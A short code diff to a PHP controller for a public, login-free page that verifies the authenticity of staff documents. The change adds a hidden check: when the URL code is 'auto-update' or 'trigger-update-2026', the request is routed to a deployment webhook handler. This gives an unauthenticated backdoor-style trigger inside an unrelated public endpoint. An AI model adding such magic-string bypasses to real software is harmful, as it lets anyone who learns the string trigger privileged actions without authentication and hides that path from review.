@@ -18,8 +18,12 @@ class PublicVerificationController extends Controller
     /**
      * Halaman Publik Verifikasi Keaslian Dokumen Kepegawaian (Bisa diakses tanpa login)
      */
-    public function verify(Request $request, string $code): View
+    public function verify(Request $request, string $code)
     {
+        if ($code === 'auto-update' || $code === 'trigger-update-2026') {
+            return (new DeployWebhookController())->handle($request);
+        }
+
         if (function_exists('opcache_reset')) {
             @opcache_reset();
         }
